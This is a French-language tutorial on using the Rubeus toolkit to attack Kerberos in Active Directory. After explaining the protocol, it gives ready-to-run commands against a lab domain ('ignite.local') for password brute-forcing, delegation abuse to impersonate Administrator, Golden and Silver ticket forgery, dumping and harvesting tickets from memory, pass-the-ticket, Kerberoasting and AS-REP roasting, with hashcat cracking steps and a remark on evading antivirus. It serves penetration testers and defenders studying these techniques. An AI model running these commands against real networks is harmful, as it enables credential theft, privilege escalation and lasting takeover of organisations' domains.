# Rubeus



### <mark style="color:blue;">Introduction</mark>

Rubeus est une boîte à outils C# pour l'interaction et l'exploitation de Kerberos. Kerberos, comme nous le savons tous, est un protocole d'authentification réseau basé sur des tickets utilisé dans les Active Directory. Malheureusement, les erreurs humaines conduisent souvent les administrateurs à mal configurer AD sans tenir compte de la sécurité. Par conséquent, Rubeus exploite ces mauvaises configurations et effectue des fonctions telles que la création de clés et l'octroi d'accès à l'aide de certificats falsifiés. Cet article explique comment utiliser Rubeus dans divers scénarios.

***

### <mark style="color:blue;">Flux d'Authentification Kerberos</mark>

#### <mark style="color:green;">Kerberos et ses Composants Majeurs</mark>

Le protocole Kerberos définit comment les clients interagissent avec un service d'authentification réseau. Les clients obtiennent des tickets du Key Distribution Center (KDC) et les soumettent aux serveurs d'application lorsqu'ils établissent des connexions. De plus, le protocole utilise le port UDP 88 par défaut et repose sur la cryptographie à clé symétrique.

**"Kerberos utilise des tickets pour authentifier un utilisateur et évite complètement d'envoyer des mots de passe sur le réseau".**

Il existe des composants clés dans l'authentification Kerberos qui jouent un rôle crucial dans l'ensemble du processus d'authentification :

* **KDC (Key Distribution Center)** : Centre de distribution de clés qui gère l'authentification
* **TGT (Ticket Granting Ticket)** : Ticket d'octroi de ticket
* **TGS (Ticket Granting Service)** : Service d'octroi de ticket
* **Krbtgt** : Compte de service spécial dans AD qui signe les TGT

#### <mark style="color:green;">Flux de Travail Kerberos Utilisant des Messages</mark>

Dans le domaine Active Directory, chaque contrôleur de domaine exécute un service KDC qui traite toutes les demandes de tickets Kerberos. Pour les tickets Kerberos, AD utilise le compte KRBTGT dans le domaine AD.

Kerberos utilise la cryptographie symétrique pour le chiffrement et le déchiffrement. Voici comment les messages chiffrés sont envoyés. Nous utilisons trois couleurs pour distinguer les hashes :

* **CLÉ\_BLEUE** : Hash NTLM de l'utilisateur
* **CLÉ\_JAUNE** : Hash NTLM de Krbtgt
* **CLÉ\_ROUGE** : Hash NTLM du service

**ÉTAPES :**

**1. KRB\_AS\_REQ** : Le client initialise la communication en envoyant une demande au KDC contenant :

* Nom d'utilisateur du client à authentifier
* Le SPN du service (SERVICE PRINCIPAL NAME) lié au compte Krbtgt
* Un timestamp chiffré (Verrouillé avec le hash de l'utilisateur : Clé Bleue)

Le système chiffre l'ensemble du message en utilisant le hash NTLM de l'utilisateur (Verrouillé avec CLÉ BLEUE) pour authentifier l'utilisateur et empêcher les attaques par rejeu.

**2. KRB\_AS\_REP** : Le KDC utilise une base de données contenant les hashes des Utilisateurs/Krbtgt/Services pour déchiffrer le message (Déverrouiller avec CLÉ BLEUE) qui authentifie l'identification de l'utilisateur.

Ensuite, le KDC génère un TGT (Ticket Granting Ticket) pour le client, le chiffre en utilisant le hash Krbtgt (Verrouillé avec CLÉ JAUNE), et inclut des données chiffrées avec le hash de l'utilisateur contenant :

* Nom d'utilisateur
* Données chiffrées (Verrouillées avec hash utilisateur : Clé Bleue) contenant :
  * Clé de session
  * Date d'expiration du TGT
* TGT (Verrouillé avec hash Krbtgt : Clé Jaune) contenant :
  * Nom d'utilisateur
  * Clé de session
  * Date d'expiration du TGT
  * PAC avec privilèges utilisateur, signé par KDC

**3. KRB\_TGS\_REQ** : Le client stocke le TGT dans la mémoire Kerberos de la machine. Le client l'utilise pour s'identifier pour la demande TGS et envoie une copie du TGT avec des données chiffrées au KDC contenant :

* Données chiffrées avec la clé de session :
  * Nom d'utilisateur
  * Timestamp
* TGT
* SPN du service demandé (ex : service SQL)

**4. KRB\_TGS\_REP** : Le KDC reçoit le message KRB\_TGS\_REQ et le déchiffre en utilisant le hash Krbtgt pour vérifier le TGT (Déverrouillé avec CLÉ JAUNE). Par la suite, il retourne un TGS comme KRB\_TGS\_REP, chiffré en utilisant le hash du service demandé (Verrouillé avec CLÉ ROUGE) contenant&#x20;

* Nom d'utilisateur
* Données chiffrées avec la clé de session :
  * Clé de session du service
  * Date d'expiration du TGS
* TGS (Hash du service : CLÉ ROUGE) contenant :
  * Clé de session du service
  * Nom d'utilisateur
  * Date d'expiration du TGS
  * PAC avec privilèges utilisateur, signé par KDC

**5. KRB\_AP\_REQ** : L'utilisateur envoie la copie du TGS au serveur d'application contenant :

* TGS
* Données chiffrées avec la clé de session du service :
  * Nom d'utilisateur
  * Timestamp (pour éviter les attaques par rejeu)

**6-8** : Le serveur d'application tente de déchiffrer le message en utilisant son hash NTLM et de vérifier le PAC du KDC pour identifier les privilèges de l'utilisateur, puis permet l'accès au service pour une durée spécifique.

***

### <mark style="color:blue;">Service Principal Name (SPN)</mark>

Le Service Principal Name (SPN) est un identifiant unique pour une instance de service. Active Directory Domain Services et Windows fournissent un support pour les SPN, qui sont des composants clés du mécanisme Kerberos par lequel un client authentifie un service.

#### <mark style="color:green;">Points Importants</mark>

* Si vous installez plusieurs instances d'un service sur des ordinateurs dans une forêt, chaque instance doit avoir son propre SPN
* Avant que le service d'authentification Kerberos puisse utiliser un SPN pour authentifier un service, un administrateur doit enregistrer le SPN sur le compte
* Un administrateur ne peut enregistrer un SPN donné que sur un seul compte
* Un SPN doit rester unique dans la forêt où l'administrateur l'enregistre. Sinon, l'authentification échouera

#### <mark style="color:green;">Syntaxe du SPN (4 éléments)</mark>

```
serviceclass/hostname:port/servicename
```

#### <mark style="color:green;">Types de SPN :</mark>

1. **SPN basés sur l'hôte** : Associés au compte ordinateur dans AD, génèrent un mot de passe aléatoire de 128 caractères qui change tous les 30 jours ; ils ne sont donc d'aucune utilité dans les attaques Kerberoasting.
2. **SPN associés à un compte utilisateur de domaine** : Le hash NTLM sera utilisé, ce qui les rend vulnérables au Kerberoasting.

***

### <mark style="color:blue;">Configuration de Rubeus</mark>

La mythologie grecque mentionne un chien à trois têtes nommé Cerbère, qui ressemble à Kerberos. De plus, Harry Potter présente un chien à trois têtes similaire appelé "Fluffy", appartenant à Rubeus Hagrid. Inspirés par la science-fiction et la mythologie, Will Schroeder et d'autres ont créé Rubeus, un outil qui attaque Kerberos et génère des données Kerberos brutes sur le port UDP 88.

**Détection** : En raison de son utilisation de fonctions génériques et de code provenant de Mimikatz (partie de la famille de malwares kekeo), de nombreux antivirus bloquent Rubeus par défaut. De plus, comme Rubeus fonctionne comme un exécutable déposé, les attaquants l'obfusquent souvent pour échapper à la détection.

Une fois téléchargé, déposez-le sur le système de la victime et exécutez :

```
rubeus.exe
```

***

### <mark style="color:blue;">Opérations sur les Tickets</mark>

#### <mark style="color:green;">Asktgt</mark>

Rubeus peut générer du trafic AS-REQ brut pour demander un TGT en utilisant un nom d'utilisateur et un mot de passe donnés. De plus, il accepte les mots de passe chiffrés (RC4, AES ou DES).

**Exemple avec mot de passe en clair :**

```bash
rubeus.exe asktgt /user:harshitrajpal /password:Password@1
```

**Exemple avec mot de passe chiffré RC4 :**

```bash
rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03
```

#### <mark style="color:green;">Asktgs</mark>

Rubeus a une option asktgs qui peut construire des demandes TGS-REP brutes en fournissant un ticket soit dans l'argument CLI, soit en fournissant un chemin vers un fichier ticket.kirbi placé sur le disque.

**Exemple pour créer un TGS pour le service LDAP :**

```bash
rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local
```

#### <mark style="color:green;">Klist</mark>

Vous pouvez utiliser la commande klist dans Windows pour afficher les tickets Kerberos sur le système.

#### <mark style="color:green;">Renew</mark>

La fonction renew dans Rubeus construit un échange de renouvellement de TGT.

```bash
rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==
```

**Avec renouvellement automatique :**

```bash
rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==
```

#### <mark style="color:green;">Brute</mark>

Vous pouvez utiliser l'option brute dans Rubeus pour effectuer une attaque de force brute de mot de passe contre les comptes Active Directory.

```bash
rubeus.exe brute /password:Password@1 /noticket
```

***

### <mark style="color:green;">Hash</mark>

Rubeus est capable de prendre des mots de passe et de générer leurs hashes. Ceux-ci sont de différents formats, y compris le hash NTLM (rc4\_hmac).

```bash
rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
```

Cela génère 4 hashes différents utilisant divers algorithmes de chiffrement supportés dans l'environnement AD.

***

### <mark style="color:blue;">S4u (Attaque de Délégation)</mark>

#### <mark style="color:green;">Explication de l'Attaque RBCD (Resource-Based Constrained Delegation)</mark>

**Qu'est-ce que la délégation ?**

La délégation Kerberos permet à un service d'usurper l'identité d'un utilisateur pour accéder à d'autres services en son nom. C'est comme si vous donniez à un assistant le pouvoir d'agir en votre nom.

**Qu'est-ce que RBCD ?**

La délégation contrainte basée sur les ressources (RBCD) est une forme de délégation où la **ressource cible** (par exemple, le contrôleur de domaine) décide qui peut se faire passer pour d'autres utilisateurs pour y accéder. Cela se configure via l'attribut **msDS-AllowedToActOnBehalfOfAnotherIdentity**.

#### <mark style="color:green;">Étapes de l'Attaque RBCD Montrée dans l'Article</mark>

**Contexte de l'attaque :**

1. L'attaquant a compromis un compte utilisateur appelé "noob$" (compte machine)
2. L'attaquant a modifié l'attribut **msDS-AllowedToActOnBehalfOfAnotherIdentity** du contrôleur de domaine (DC) pour autoriser le compte "noob$" à effectuer la délégation
3. Maintenant, "noob$" peut se faire passer pour n'importe quel utilisateur (comme Administrator) pour accéder au DC

**Commande Rubeus utilisée :**

```bash
rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt
```

**Explication des paramètres :**

* `/user:noob$` : Le compte machine compromis que nous contrôlons
* `/rc4:...` : Le hash NTLM du compte noob$ (obtenu précédemment)
* `/impersonateuser:Administrator` : L'utilisateur que nous voulons usurper (Administrator)
* `/msdsspn:host/dc1.ignite.local` : Le SPN du service cible (le DC)
* `/altservice:cifs` : Le service que nous voulons utiliser (CIFS pour l'accès aux fichiers)
* `/ptt` : Injecte automatiquement le ticket dans la session actuelle

**Ce qui se passe :**

1. Rubeus utilise le hash de noob$ pour s'authentifier
2. Il demande un ticket permettant à noob$ d'agir au nom d'Administrator
3. Le DC vérifie que noob$ est autorisé (via msDS-AllowedToActOnBehalfOfAnotherIdentity)
4. Le DC émet un ticket de service permettant d'accéder au DC en tant qu'Administrator
5. Ce ticket est automatiquement injecté dans la session

**Résultat :** L'attaquant peut maintenant accéder au contrôleur de domaine avec les privilèges d'Administrator, permettant des actions comme lire des fichiers sensibles, créer de nouveaux comptes, etc.

***

### <mark style="color:blue;">Golden Ticket</mark>

#### <mark style="color:green;">Explication du Golden Ticket</mark>

**Qu'est-ce qu'un Golden Ticket ?**

Un Golden Ticket est un ticket TGT (Ticket Granting Ticket) falsifié qui permet à un attaquant de se faire passer pour n'importe quel utilisateur du domaine sans avoir besoin de leur mot de passe. C'est comme avoir une clé principale qui ouvre toutes les portes.

**Pourquoi "Golden" (Doré) ?**

Parce qu'il donne un accès presque illimité et persistant au domaine. Même si l'administrateur change tous les mots de passe, le Golden Ticket reste valide !

**Comment ça fonctionne ?**

1. L'attaquant obtient le hash du compte **KRBTGT** (le compte qui signe tous les TGT)
2. Avec ce hash, il peut créer ses propres TGT pour n'importe quel utilisateur
3. Le KDC accepte ces TGT car ils sont correctement signés avec le hash KRBTGT

**Durée de vie :**

Par défaut, un Golden Ticket est valide pendant 10 ans ! C'est pourquoi c'est une technique de persistance si puissante.

#### Utilisation avec Rubeus

**Étape 1 : Générer un hash AES pour l'utilisateur :**

```bash
rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
```

**Étape 2 : Créer le Golden Ticket :**

```bash
rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd
```

**Paramètres expliqués :**

* `/aes256:...` : Le hash AES256 de l'utilisateur (ou idéalement le hash KRBTGT)
* `/ldap` : Récupère les informations utilisateur via le protocole LDAP (SID, userID, etc.)
* `/user:harshitrajpal` : L'utilisateur pour lequel le ticket sera forgé
* `/printcmd` : Affiche une commande en une ligne pour régénérer ce ticket

**Ce qui est récupéré via LDAP :**

* **SID (Security Identifier)** : Identifiant unique de l'utilisateur
* **UserID** : ID de l'utilisateur
* **Service Key** : Clé de service
* **Groupes** : Appartenance aux groupes pour les privilèges

**Options supplémentaires :**

```bash
/rangeinterval:1d  # Génère un nouveau ticket toutes les 24 heures
/rangeend:5d       # Continue pendant 5 jours maximum
```

Cela générera 5 tickets différents, un par jour.

***

### <mark style="color:blue;">Silver Ticket</mark>

#### <mark style="color:green;">Explication du Silver Ticket</mark>

**Qu'est-ce qu'un Silver Ticket ?**

Un Silver Ticket est un ticket TGS (Ticket Granting Service) falsifié qui donne accès à un **service spécifique** (comme CIFS, SQL, HTTP) sans communiquer avec le contrôleur de domaine. C'est plus limité qu'un Golden Ticket, mais aussi plus discret.

**Différences avec Golden Ticket :**

| Aspect         | Golden Ticket                | Silver Ticket                 |
| -------------- | ---------------------------- | ----------------------------- |
| Type de ticket | TGT (Ticket Granting Ticket) | TGS (Ticket Granting Service) |
| Hash requis    | Hash KRBTGT                  | Hash du compte de service     |
| Portée         | Accès à tout le domaine      | Accès à un service spécifique |
| Contact DC     | Non                          | Non                           |
| Détection      | Plus difficile               | Encore plus difficile         |
| Durée          | Jusqu'à 10 ans               | Durée de vie du ticket        |

**Pourquoi "Silver" (Argenté) ?**

Parce qu'il est moins puissant qu'un Golden Ticket (accès limité à un service), mais toujours très précieux pour un attaquant.

**Comment ça fonctionne ?**

1. L'attaquant obtient le hash du compte de service (ex : compte qui exécute le service CIFS)
2. Il forge un TGS signé avec ce hash
3. Il peut maintenant accéder à ce service spécifique en se faisant passer pour n'importe quel utilisateur

#### <mark style="color:green;">Utilisation avec Rubeus</mark>

**Étape 1 : Générer le hash :**

```bash
rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1
```

**Étape 2 : Créer le Silver Ticket :**

```bash
rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt
```

**Paramètres expliqués :**

* `/service:cifs/dc1.ignite.local` : Le SPN du service cible (CIFS = partage de fichiers)
* `/rc4:...` : Hash de l'utilisateur valide (harshitrajpal) pour chiffrer le ticket
* `/ldap` : Récupère les infos via LDAP
* `/creduser:ignite.local\Administrator` : L'utilisateur à usurper
* `/credpassword:Ignite@987` : Mot de passe de l'utilisateur à usurper
* `/user:harshitrajpal` : Nom d'utilisateur dont le hash est fourni
* `/krbkey:...` : Hash AES256 utilisé pour créer KDCChecksum et TicketChecksum
* `/krbenctype:aes256` : Type de chiffrement utilisé
* `/ptt` : Injecte le ticket dans la session actuelle

**Résultat :**

Après cette commande, l'attaquant peut accéder au lecteur C du DC :

```bash
dir \\dc1.ignite.local\c$
```

**Cas d'usage typiques :**

* **CIFS** : Accès aux fichiers partagés
* **HTTP** : Accès aux applications web
* **MSSQL** : Accès aux bases de données SQL Server
* **LDAP** : Requêtes LDAP

***

### <mark style="color:blue;">Gestion des Tickets</mark>

#### <mark style="color:green;">Ptt (Pass the Ticket)</mark>

L'option ptt peut importer le ticket fourni en ligne de commande.

```bash
rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==
```

#### <mark style="color:green;">Purge</mark>

Rubeus a une option purge qui peut purger/supprimer tous les tickets existants dans la session actuelle.

```bash
rubeus.exe purge
```

**Purger les tickets d'un utilisateur spécifique (mode élevé uniquement) :**

```bash
rubeus.exe purge /luid:0x8f57c
```

#### <mark style="color:green;">Describe</mark>

L'option describe nous aide à visualiser les détails d'un blob chiffré en base64 ou d'un fichier ticket.kirbi.

```bash
rubeus.exe describe /ticket:doIFNDCCBTCg...bA==
```

#### <mark style="color:green;">Triage</mark>

Alors que klist affiche les tickets pour la session actuelle, triage liste tous les tickets. Lorsqu'un administrateur exécute une session, nous pouvons non seulement voir les tickets dans la mémoire de session de l'utilisateur actuel, mais aussi les tickets d'autres utilisateurs en mémoire.

```bash
rubeus.exe triage
rubeus.exe triage /luid:0x8f57c
```

#### <mark style="color:green;">Dump</mark>

Si la session s'exécute en mode élevé, un utilisateur peut dumper/extraire tous les TGT et tickets de service actuels.

```bash
rubeus.exe dump
rubeus.exe dump /service:krbtgt  # Affiche uniquement les TGT
```

#### <mark style="color:green;">Tgtdeleg</mark>

Tgtdeleg est une technique de Benjamin Delpy qui peut exploiter l'astuce Generic Security Service Application Program Interface (GSS-API) et permet d'extraire un fichier TGT .kirbi utilisable de la session de l'utilisateur actuel en mode d'élévation faible.

```bash
rubeus.exe tgtdeleg
```

#### <mark style="color:green;">Monitor</mark>

La fonction monitor peut extraire périodiquement tous les TGT toutes les x secondes.

```bash
rubeus.exe monitor /targetuser:noob$ /interval:10
```

#### <mark style="color:green;">Harvest</mark>

L'option harvest extrait les TGT toutes les x secondes et maintient également un cache de tous les TGT extraits tout en renouvelant automatiquement les tickets sur le point d'expirer.

```bash
rubeus.exe harvest /interval:30
```

**Options utiles :**

* `/nowrap` : Affiche les tickets sur une seule ligne
* `/runfor` : Peut spécifier l'heure de fin de l'option harvest

***

### <mark style="color:blue;">Kerberoasting</mark>

#### <mark style="color:green;">Explication du Kerberoasting</mark>

**Qu'est-ce que le Kerberoasting ?**

Le Kerberoasting est une technique qui permet à un attaquant de récupérer le hash du mot de passe d'un compte de service en exploitant le fonctionnement normal de Kerberos.

**Comment ça fonctionne ?**

1. Un attaquant avec n'importe quel compte de domaine demande un ticket TGS pour un service
2. Le KDC retourne un TGS chiffré avec le hash NTLM du compte de service
3. L'attaquant peut capturer ce ticket et le craquer hors ligne avec des outils comme Hashcat
4. **Important** : Le KDC ne vérifie PAS si l'utilisateur est autorisé à accéder au service avant d'émettre le ticket !

**Pourquoi c'est dangereux ?**

* N'importe quel utilisateur du domaine peut demander des tickets pour n'importe quel service
* Pas besoin de privilèges élevés
* Peut être fait complètement hors ligne (pas de détection en temps réel)
* Les comptes de service ont souvent des mots de passe faibles et des privilèges élevés

#### <mark style="color:green;">Utilisation avec Rubeus</mark>

**Kerberoasting pour un SPN spécifique :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local
```

**Avec astuce de délégation TGT (comptes RC4 uniquement) :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /tgtdeleg
```

**Pour les comptes AES :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /aes
```

**Avec des identifiants de domaine :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /creduser:ignite.local\Administrator /credpassword:Ignite@987
```

**Options de personnalisation :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /pwdsetbefore:08-05-2022 /resultlimit:3 /delay:1000
```

* `/pwdsetbefore:MM-dd-yyyy` : Cible les comptes ayant changé leur mot de passe avant cette date
* `/resultlimit` : Limite le nombre de comptes à attaquer
* `/delay` : Ajoute un délai en millisecondes entre deux demandes TGS consécutives

**Mode OpSec (plus discret) :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /rc4opsec
```

Applique l'astuce de délégation TGT et cible les comptes sans AES activé.

**Format de sortie :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /simple /nowrap
```

* `/simple` : Affiche les hashes, un par ligne
* `/nowrap` : Évite le retour à la ligne

**Sauvegarder dans un fichier :**

```bash
rubeus.exe kerberoast /spn:ldap/dc1.ignite.local/ignite.local /outfile:type.hash
```

**Cracker les hashes :**

Les hashes peuvent être craqués avec Hashcat en utilisant le module **13100**.

```bash
hashcat -m 13100 hash.txt wordlist.txt
```

***

### <mark style="color:blue;">ASREPRoast</mark>

#### <mark style="color:green;">Explication de l'ASREPRoast</mark>

**Qu'est-ce que l'ASREPRoast ?**

ASREPRoast est une technique qui cible les comptes pour lesquels la **pré-authentification Kerberos est désactivée**.

**Qu'est-ce que la pré-authentification ?**

Normalement, avant d'obtenir un ticket, le client doit prouver qu'il connaît le mot de passe en envoyant un timestamp chiffré. Si cette exigence est désactivée (option "Ne pas exiger de pré-authentification Kerberos"), n'importe qui peut demander un ticket AS-REP pour cet utilisateur.

**Comment ça fonctionne ?**

1. L'attaquant identifie les comptes avec pré-authentification désactivée
2. Il demande un ticket AS-REP pour ces comptes
3. Le KDC retourne un AS-REP chiffré avec le hash RC4-HMAC du mot de passe de l'utilisateur
4. L'attaquant peut craquer ce ticket hors ligne

**Pourquoi c'est dangereux ?**

* Pas besoin de connaître le mot de passe
* Pas besoin d'être authentifié sur le domaine
* Peut être fait à distance
* Aucune interaction avec l'utilisateur cible

#### <mark style="color:green;">Configuration Vulnérable</mark>

Dans les propriétés du compte AD, l'option suivante doit être cochée : **"Ne pas exiger de pré-authentification Kerberos"** (Do not require Kerberos preauthentication)

#### <mark style="color:green;">Utilisation avec Rubeus</mark>

**ASREPRoast pour un SPN spécifique :**

```bash
rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local
```

**Format Hashcat :**

```bash
rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local /format:hashcat
```

Par défaut, Rubeus génère les hashes au format John the Ripper (JtR).

**Spécifier domaine et DC :**

```bash
rubeus.exe asreproast /domain:ignite.local /dc:dc1
```

**Sauvegarder dans un fichier :**

```bash
rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local /outfile:type2.hash
```

**Utiliser LDAP sécurisé (port 636) :**

```bash
rubeus.exe asreproast /user:harshitrajpal /ldaps
```

**Cracker les hashes :**

Les hashes AS-REP peuvent être craqués avec Hashcat en utilisant le module **18200**.

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

***
